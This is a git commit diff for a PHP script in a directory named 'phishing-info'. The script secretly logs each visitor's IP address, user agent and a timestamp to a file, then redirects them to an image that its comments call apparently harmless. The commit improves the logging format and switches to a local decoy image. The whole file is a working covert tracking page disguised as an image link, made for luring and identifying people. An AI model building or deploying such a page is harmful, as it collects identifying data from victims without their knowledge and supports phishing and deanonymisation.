bf1a1c68c2d0eb37b3285b57cbad67c5603c6ec4
Gerard Loriz <gerardloriz@ginebro.cat>
2023-10-23 17:08:10 +0200

    log

--- phishing-info/index.php
+++ phishing-info/index.php
@@ -3,11 +3,21 @@
 $ip = $_SERVER['REMOTE_ADDR']; // Dirección IP del cliente
 $user_agent = $_SERVER['HTTP_USER_AGENT']; // Agente de usuario del navegador
 
-// Registrar información en un archivo (registra la dirección IP y el agente de usuario)
-$archivo = fopen('informacion.txt', 'a');
-fwrite($archivo, "IP: " . $ip . " - User Agent: " . $user_agent . "\n");
+// Obtener la fecha y hora actual
+$fecha = date('Y-m-d H:i:s');
+
+// Formatear el mensaje de registro
+$mensaje = "Fecha: " . $fecha . " - IP: " . $ip . " - User Agent: " . $user_agent . "\n";
+
+// Abrir o crear el archivo de registro (log)
+$archivo = fopen('registro.log', 'a');
+
+// Escribir el mensaje en el archivo de registro
+fwrite($archivo, $mensaje);
+
+// Cerrar el archivo de registro
 fclose($archivo);
 
 // Redirigir a una imagen aparentemente inofensiva
-header('Location: https://ruta_a_tu_imagen.com/foto.jpg');
+header('Location: ./foto.jpeg');
 ?>
